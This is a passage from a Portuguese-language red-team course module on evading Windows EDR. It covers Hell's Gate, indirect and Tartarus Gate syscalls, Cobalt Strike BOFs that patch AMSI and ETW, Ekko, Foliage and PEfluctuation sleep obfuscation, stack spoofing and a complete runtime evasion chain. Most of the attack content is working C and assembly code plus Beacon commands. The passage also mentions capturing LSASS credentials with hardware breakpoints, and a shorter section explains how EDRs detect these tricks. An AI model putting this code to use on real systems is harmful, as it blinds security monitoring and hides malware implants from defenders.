; Recebe SSN em RCX, demais parâmetros deslocados
HellsGate_Syscall PROC
    ; Salvar SSN (primeiro argumento)
    mov r10, rcx        ; r10 = SSN
    ; Shift dos argumentos reais
    mov rcx, rdx        ; arg1 = segundo parâmetro original
    mov rdx, r8         ; arg2
    mov r8, r9          ; arg3
    ; arg4+ já está na stack
    ; Executar syscall com SSN em rax
    mov rax, r10
    syscall
    ret
HellsGate_Syscall ENDP
```

#### Indirect Syscalls — Melhor OPSEC

Indirect syscalls resolvem o problema do call stack executando a instrução `syscall` de dentro de ntdll.dll, mas com o SSN que o atacante quer.

**Como funciona:**
1. Encontrar o endereço da instrução `syscall` dentro de qualquer função Nt* em ntdll
2. Configurar o SSN desejado em `rax`
3. Fazer JMP para o endereço da instrução `syscall` em ntdll
4. O `syscall` executa, e o `ret` seguinte retorna para ntdll

**Resultado:** O call stack mostra que a instrução `syscall` foi executada de dentro de ntdll.dll, parecendo legítimo para o EDR.

```c
// Encontrar offset da instrução 'syscall' dentro de função Nt* em ntdll
PVOID FindSyscallInstruction(PVOID funcAddress) {
    PBYTE bytes = (PBYTE)funcAddress;
    
    // Procurar os bytes 0F 05 (opcode de syscall x64) nos primeiros 32 bytes
    for (int i = 0; i < 32; i++) {
        if (bytes[i] == 0x0F && bytes[i+1] == 0x05) {
            return (PVOID)(bytes + i);
        }
    }
    return NULL;
}
```

```asm
; indirect_syscall.asm
; pSyscallAddr deve apontar para instrução 'syscall' dentro de ntdll
EXTERN pSyscallAddr:QWORD

IndirectSyscall PROC
    mov r10, rcx
    ; rax já foi configurado com SSN pelo caller
    jmp qword ptr [pSyscallAddr]  ; salta para syscall em ntdll
IndirectSyscall ENDP
```

#### Tartarus Gate — Lidando com Funções Hookadas

Se o EDR hookei a função Nt* que queremos usar (substituiu os primeiros bytes com JMP), não podemos ler o SSN dos primeiros bytes. Tartarus Gate resolve isso usando o SSN de uma função **vizinha** (que pode não estar hookada) e calculando o offset.

**Princípio:** As funções Nt* em ntdll são ordenadas sequencialmente. Se `NtAllocateVirtualMemory` tem SSN N, então `NtAllocateVirtualMemoryEx` tem SSN N+1, e assim por diante. Os SSNs são contíguos e ordenados pelos nomes das funções.

```c
// Tartarus Gate: encontrar SSN usando vizinhos
DWORD TartarusGate_GetSSN(const char* funcName) {
    PVOID ntdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)ntdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    PDWORD names    = (PDWORD)((PBYTE)ntdll + expDir->AddressOfNames);
    PDWORD funcs    = (PDWORD)((PBYTE)ntdll + expDir->AddressOfFunctions);
    PWORD  ordinals = (PWORD) ((PBYTE)ntdll + expDir->AddressOfNameOrdinals);
    
    // Encontrar índice da função alvo
    int targetIdx = -1;
    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        if (strcmp((char*)((PBYTE)ntdll + names[i]), funcName) == 0) {
            targetIdx = i;
            break;
        }
    }
    if (targetIdx == -1) return 0xFFFFFFFF;
    
    PVOID targetFunc = (PVOID)((PBYTE)ntdll + funcs[ordinals[targetIdx]]);
    
    // Tentar ler SSN da função alvo
    DWORD ssn = ExtractSSN(targetFunc);
    if (ssn != 0xFFFFFFFF) return ssn;  // Não hookada — SSN direto
    
    // Função hookada — procurar em vizinhos
    // Procurar para cima (funções com SSN menor)
    for (int offset = 1; offset <= 10; offset++) {
        if (targetIdx - offset < 0) break;
        PVOID neighbor = (PVOID)((PBYTE)ntdll + funcs[ordinals[targetIdx - offset]]);
        DWORD neighborSSN = ExtractSSN(neighbor);
        if (neighborSSN != 0xFFFFFFFF) {
            return neighborSSN + offset;  // SSN alvo = vizinho SSN + offset
        }
    }
    
    // Procurar para baixo
    for (int offset = 1; offset <= 10; offset++) {
        if (targetIdx + offset >= (int)expDir->NumberOfNames) break;
        PVOID neighbor = (PVOID)((PBYTE)ntdll + funcs[ordinals[targetIdx + offset]]);
        DWORD neighborSSN = ExtractSSN(neighbor);
        if (neighborSSN != 0xFFFFFFFF) {
            return neighborSSN - offset;
        }
    }
    
    return 0xFFFFFFFF;  // Não foi possível determinar SSN
}
```

### Parte 6 — ETW e AMSI Patch via BOF

#### AMSI (Anti-Malware Scan Interface)

AMSI permite que aplicações enviem conteúdo para o antivírus antes de executar. PowerShell, .NET e outros runtimes usam AMSI para escanear scripts e assemblies antes de executar.

**Função chave:** `AmsiScanBuffer` em `amsi.dll`

**Patch via BOF** — código C para um BOF que patcha AMSI no processo atual:

```c
// bof_amsi_patch.c
// Compilar com: x86_64-w64-mingw32-gcc -c bof_amsi_patch.c -o bof_amsi_patch.o

#include <windows.h>
#include "beacon.h"  // Header do Cobalt Strike BOF API

// Declarações para funções Windows via macros do Beacon
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);

void go(char* args, int alen) {
    // Carregar amsi.dll se não estiver carregada
    HMODULE hAmsi = KERNEL32$GetModuleHandleA("amsi.dll");
    if (!hAmsi) {
        BeaconPrintf(CALLBACK_ERROR, "amsi.dll nao carregada neste processo\n");
        return;
    }
    
    // Obter endereço de AmsiScanBuffer
    FARPROC AmsiScanBuffer = KERNEL32$GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!AmsiScanBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "Nao encontrou AmsiScanBuffer\n");
        return;
    }
    
    // Patch: substituir primeiros bytes com 'ret' ou retorno de AMSI_RESULT_CLEAN
    // Patch x64: 
    //   mov eax, 0x80070057  (E_INVALIDARG — AMSI_RESULT_CLEAN equivalente)
    //   ret
    // Bytes: B8 57 00 07 80 C3
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    // Alternativa mais simples (apenas ret):
    // unsigned char patch[] = { 0xC3 };  // ret
    
    DWORD oldProtect;
    
    // Tornar região gravável
    if (!KERNEL32$VirtualProtect((LPVOID)AmsiScanBuffer, sizeof(patch),
                                  PAGE_READWRITE, &oldProtect)) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualProtect falhou\n");
        return;
    }
    
    // Escrever patch
    for (int i = 0; i < sizeof(patch); i++) {
        ((unsigned char*)AmsiScanBuffer)[i] = patch[i];
    }
    
    // Restaurar proteção original
    KERNEL32$VirtualProtect((LPVOID)AmsiScanBuffer, sizeof(patch),
                             oldProtect, &oldProtect);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI patchado com sucesso\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] AmsiScanBuffer @ 0x%p\n", (void*)AmsiScanBuffer);
}
```

#### ETW (Event Tracing for Windows)

ETW é o framework de logging do Windows. EDRs, antivírus e o próprio sistema usam ETW para registrar eventos de segurança — incluindo carregamento de módulos, chamadas de API suspeitas, alocações de memória executável.

**Função chave:** `EtwEventWrite` em `ntdll.dll`

**Patch que faz EtwEventWrite retornar imediatamente:**

```c
// bof_etw_patch.c
// Parte do mesmo BOF ou BOF separado

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);

void patch_etw() {
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    FARPROC EtwEventWrite = KERNEL32$GetProcAddress(hNtdll, "EtwEventWrite");
    
    if (!EtwEventWrite) {
        BeaconPrintf(CALLBACK_ERROR, "Nao encontrou EtwEventWrite\n");
        return;
    }
    
    // Patch: ret imediato (não envia eventos ETW)
    // Em x64: C3 = ret
    unsigned char patch[] = { 0xC3 };
    
    DWORD oldProtect;
    KERNEL32$VirtualProtect((LPVOID)EtwEventWrite, sizeof(patch),
                             PAGE_READWRITE, &oldProtect);
    
    ((unsigned char*)EtwEventWrite)[0] = patch[0];
    
    KERNEL32$VirtualProtect((LPVOID)EtwEventWrite, sizeof(patch),
                             oldProtect, &oldProtect);
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW patchado — EtwEventWrite retorna imediatamente\n");
}

// BOF entry point que faz ambos os patches
void go(char* args, int alen) {
    patch_etw();
    // AMSI patch está em função separada no mesmo arquivo ou em BOF separado
}
```

**Compilar o BOF:**
```bash
x86_64-w64-mingw32-gcc -masm=intel -o bof_amsi_etw.o -c bof_amsi_etw.c
```

**Carregar no Cobalt Strike:**
```
beacon> inline-execute /path/to/bof_amsi_etw.o
```

**Nota sobre ETW patch:** Patchar `EtwEventWrite` afeta todos os provedores ETW no processo. Em alguns ambientes, isso em si é detectável via processo monitorando o próprio ETW (meta-monitoring). Uma alternativa mais cirúrgica é usar `NtTraceEvent` ou desabilitar apenas o provedor ETW específico do Defender/MDE.

---

## Na Prática

### Workflow de Sleep Mask em Operação Real

1. **Profile do Cobalt Strike:** Habilitar sleep mask no Malleable C2 profile
   ```
   stage {
       set sleep_mask "true";
   }
   ```

2. **Compilar EKKO como BOF:** Usar repositório EKKO original com Makefile
   ```bash
   git clone https://github.com/Cracked5pider/Ekko
   cd Ekko && make
   ```

3. **Carregar e testar:**
   ```
   beacon> sleep 60 30    # 60s sleep, 30% jitter
   beacon> inline-execute Ekko.o
   ```

4. **Verificar com pe-sieve (perspectiva do defender):**
   ```cmd
   pe-sieve.exe /pid <beacon_pid>
   # Sem sleep mask: detecta shellcode
   # Com EKKO: durante sleep, não encontra padrões
   ```

### Cadeia Completa de Evasão em Runtime

```
Beacon inicia
    ↓
Patch ETW (via BOF) → desabilita logging ETW no processo
    ↓
Patch AMSI (via BOF) → desabilita scan de assemblies/scripts
    ↓
Configurar sleep mask (EKKO) → código criptografado durante sleep
    ↓
Configurar heap encryption (Maro) → dados em heap protegidos
    ↓
Usar indirect syscalls para operações sensíveis → bypassa hooks do EDR
    ↓
Executar operações de red team via BOF (in-process) → sem fork-and-run
```

---

## Detecção e OPSEC

### Como EDRs Detectam Sleep Mask

1. **Transição RX→RW detectada por kernel callbacks:** VirtualProtect de RX para RW em região sem backing file. Alguns EDRs têm kernel callbacks que capturam isso.

2. **Timer queue suspeita:** Criar muitos timers em sequência rápida é incomum para processos legítimos. Comportamento de EKKO (criar 5-6 timers em ms) pode ser detectado.

3. **Threads de thread pool executando VirtualProtect:** Thread do pool executando VirtualProtect em região de shellcode é suspeita — normalmente thread pool executa operações I/O, não muda permissões de memória.

4. **Análise de call stack de threads dormentes:** Mesmo com Foliage, retornar para frames legítimos mas em contexto incomum (ex: thread "esperando" em função que normalmente não bloqueia) pode ser detectado.

5. **Frequência de criptografia:** Regiões de memória que mudam hash MD5/SHA a cada intervalo fixo são detectáveis por scanners que fazem hashing periódico de memória.

### Como EDRs Detectam Syscalls Diretos

1. **Return address fora de ntdll:** Direct syscalls executam `syscall` de fora de ntdll. A instrução `ret` após `syscall` retorna para código em região sem backing file.

2. **Análise de call stack no retorno:** Ferramentas como Thread Stack Monitor verificam se o endereço que chamou a syscall está em ntdll.

3. **Hooks de kernel:** Alguns EDRs não dependem apenas de hooks em userland — usam kernel drivers que interceptam chamadas de syscall no kernel independentemente de onde a instrução `syscall` foi executada.

### Considerações OPSEC Gerais

- **Sleep mask não é invisível — apenas mais furtivo.** O período entre acordar e re-criptografar é uma janela de vulnerabilidade.
- **Operações longas em BOF travam o Beacon.** Sleep mask não se aplica durante execução de BOF — o Beacon está ativo e as páginas estão RX durante toda a execução.
- **Patch de AMSI/ETW em processo específico não afeta outros processos.** Se o payload migrar para outro processo, os patches precisam ser reaplicados.
- **Injetar sleep mask em processos host legítimos** (ex: dllhost.exe, svchost.exe) é mais eficaz que executar em processo próprio.

---

## Sleep Obfuscation Avançado — Ekko, Zilean, Foliage

### Por Que Sleep Obfuscation Importa

Beacon em sleep tem `.text` exposta em RX. Memory scan (Moneta, pe-sieve) durante sleep encontra shellcode em memória. Solução: **encriptar payload durante sleep** + **proteger stack/heap** para evitar exposure quando dump.

Três variantes maduras:

| Técnica | Trigger | Stack spoofing | Heap encryption |
|---------|---------|---------------|-----------------|
| **Ekko** | Timer ROP chain | Não (versão base) | Não (versão base) |
| **Zilean** | NtSetEvent + APC | Sim | Não |
| **Foliage** | NtContinue + ROP | Sim | Não |
| **DeepSleep / Ekko+stack** | Timer + spoofed stack | Sim | Sim |
| **Cronos** | Wait callback | Sim (NtContinue) | Sim |

### Ekko (Cracked5pider) — Mecânica

Cadeia ROP via `CreateTimerQueueTimer` + `NtContinue` que:

1. Cria timer queue.
2. Encadeia N timers, cada um disparando após delay X.
3. Cada callback faz:
   - VirtualProtect(.text, PAGE_READWRITE)
   - SystemFunction032 (RC4) para descriptografar/encriptar `.text`
   - WaitForSingleObject (sleep real)
   - SystemFunction032 (decrypt)
   - VirtualProtect(.text, PAGE_EXECUTE_READ)
   - NtContinue para retomar Beacon execution

Resultado: durante sleep, `.text` está **encriptada e RW**. Memory scan vê high entropy + non-executable → não dispara shellcode signatures.

### Código — Ekko Simplificado

```c
#include <windows.h>
#include <bcrypt.h>

typedef NTSTATUS (NTAPI *fnNtContinue)(PCONTEXT, BOOLEAN);
typedef NTSTATUS (NTAPI *fnSystemFunction032)(struct ustring*, struct ustring*);

void EkkoSleep(DWORD dwSleepMs) {
    CONTEXT     ctxThread = { 0 }, ctxRopProtRW = { 0 },
                ctxRopRc4Enc = { 0 }, ctxRopWait = { 0 },
                ctxRopRc4Dec = { 0 }, ctxRopProtRX = { 0 },
                ctxRopResume = { 0 };
    HANDLE      hTimerQ = NULL;
    HANDLE      hNewTimer = NULL;

    // Capturar contexto atual (RIP de retorno após sleep)
    RtlCaptureContext(&ctxThread);

    // Construir 5 ROP gadgets como CONTEXT estruturas
    ULONG_PTR pImageBase = (ULONG_PTR)GetModuleHandle(NULL);
    SIZE_T sImageSize = /* ... */;

    // Gadget 1: VirtualProtect(.text, RW)
    ctxRopProtRW.Rsp = ctxThread.Rsp;
    ctxRopProtRW.Rip = (ULONG_PTR)VirtualProtect;
    ctxRopProtRW.Rcx = pImageBase;
    ctxRopProtRW.Rdx = sImageSize;
    ctxRopProtRW.R8  = PAGE_READWRITE;
    ctxRopProtRW.R9  = (ULONG_PTR)&dwOld;

    // Gadget 2: SystemFunction032 (encrypt .text com RC4)
    // [...] preencher Rcx (USTRING data), Rdx (USTRING key)

    // Gadget 3: WaitForSingleObject (sleep real)
    ctxRopWait.Rip = (ULONG_PTR)WaitForSingleObject;
    ctxRopWait.Rcx = (ULONG_PTR)hEvent;
    ctxRopWait.Rdx = dwSleepMs;

    // Gadget 4: SystemFunction032 (decrypt)
    // [...]

    // Gadget 5: VirtualProtect(.text, RX)
    ctxRopProtRX.Rip = (ULONG_PTR)VirtualProtect;
    ctxRopProtRX.R8  = PAGE_EXECUTE_READ;

    // Criar timer queue + 5 timers em sequência
    CreateTimerQueueTimer(&hNewTimer, hTimerQ,
                          (WAITORTIMERCALLBACK)NtContinue,
                          &ctxRopProtRW, 0, 0, WT_EXECUTEINTIMERTHREAD);
    // [...] mais 4 timers com delays incrementais

    // Aguardar conclusão
    WaitForSingleObject(/* ... */);

    // Cleanup
    DeleteTimerQueue(hTimerQ);
}
```

### Foliage (kyleavery)

Variante mais leve usando `NtContinue` direto + APC:

1. Capturar contexto atual.
2. `NtCreateThreadEx(SUSPENDED, NtContinue, &ctxROPchain, ...)`.
3. Thread retomada → executa cadeia ROP → cada gadget é CONTEXT.
4. Final gadget retorna controle para Beacon.

Diferença vs Ekko: usa thread separada em vez de timer queue, evitando `CreateTimerQueueTimer` (forte IOC em alguns rule sets).

### Zilean

Combinação **Foliage + Hardware Breakpoints**: HBP para esconder cadeia ROP de memory analysis. ROP chain construída em stack thread temporária + HBP em trigger function = stack inteira invisível para forensic dump.

### Stack Spoofing — Mascaramento da Call Stack

Durante sleep, stack do Beacon revela RIP em código malicioso. Defensor faz `StackWalk64` no thread suspenso → vê stack apontando para shellcode.

**Stack Spoofing** = substituir return addresses em stack por endereços em **DLLs legítimas** (kernel32, ntdll). Ferramentas:
- SilentMoonwalk (klezvirus): spoof completo via unwind.
- NamazsoStack: spoof clássico via swap retaddrs.

Pattern: antes de sleep, gravar retaddrs falsos em RSP+0x8, RSP+0x10, etc. Stack walk vê chain limpa: `ntdll!RtlUserThreadStart → kernel32!BaseThreadInitThunk → user_code(legit)`.

```c
// Pseudo-stack spoofing
*(DWORD64*)(pCtx->Rsp + 0x08) = (DWORD64)GetProcAddress(hKern32, "BaseThreadInitThunk") + 0x14;
*(DWORD64*)(pCtx->Rsp + 0x10) = (DWORD64)GetProcAddress(hNtdll, "RtlUserThreadStart") + 0x21;
*(DWORD64*)(pCtx->Rsp + 0x18) = 0;  // terminator

// Sleep aqui — call stack inspecion vê chain legítima
```

### Heap Encryption Durante Sleep

`.text` encriptada via Ekko, mas **heap** (config Beacon, listings, sockets) fica exposto. Heap encryption durante sleep:

1. Antes de sleep, identificar heap regions (HeapWalk, ou ranges anotados).
2. Encriptar cada região.
3. Sleep.
4. Decriptar.

Combinação Ekko + heap encryption = Cobalt Strike 4.5+ default sleep mask.

### PEfluctuation

Variante leve: rotacionar page protection durante sleep entre `PAGE_READWRITE` e `PAGE_NOACCESS`.

```c
while (sleeping) {
    VirtualProtect(pText, sText, PAGE_NOACCESS, &dwOld);
    Sleep(100);
    VirtualProtect(pText, sText, PAGE_READWRITE, &dwOld);
    Sleep(100);
}
```

Memory scan que itera VAD tree pode pegar página em `PAGE_NOACCESS` momento errado → leitura falha → bypass scan. Mais leve que Ekko (sem ROP) mas menos forte.

### Hardware Breakpoint-Based Credential Dumping (Combo)

Durante sleep, atacante pode setar HBP em `BCryptDecrypt` ou `LsaProtectMemory` para capturar credenciais decriptadas em LSASS. Não é "sleep obfuscation" estrito, mas usa mesma infraestrutura HBP para coletar inteligência durante intervalos de inatividade.

---

## Módulos Relacionados

`03_amsi_bypass.md` cobre técnicas de AMSI bypass além do patch direto. `06_edr_telemetria_e_hooking.md` aprofunda ETW e hooking. `05_injecao_de_processo/03_post_exploitation_evasion_bof.md` cobre BOFs pra operações furtivas. MITRE ATT&CK: T1055 (Process Injection), T1620 (Reflective Code Loading), T1562.001 (Disable or Modify Tools), T1497 (Sandbox Evasion).

---

## Leitura Complementar

- EKKO — https://github.com/Cracked5pider/Ekko
- SysWhispers2 — https://github.com/jthuraisamy/SysWhispers2
- SysWhispers3 — https://github.com/klezVirus/SysWhispers3
- HellsGate — https://github.com/am0nsec/HellsGate
- Tartarus Gate — https://github.com/trickster0/TartarusGate
- pe-sieve — https://github.com/hasherezade/pe-sieve
- BeaconEye — https://github.com/CCob/BeaconEye
- Nanodump — https://github.com/fortra/nanodump
- MDSec — "Needles in a Haystack: Hunting for Shellcode in Memory"
- OutFlank — "Combining Direct System Calls and sRDI to bypass AV/EDR"
- SpecterOps — "Red Team Tactics: Combining Direct System Calls and sRDI"
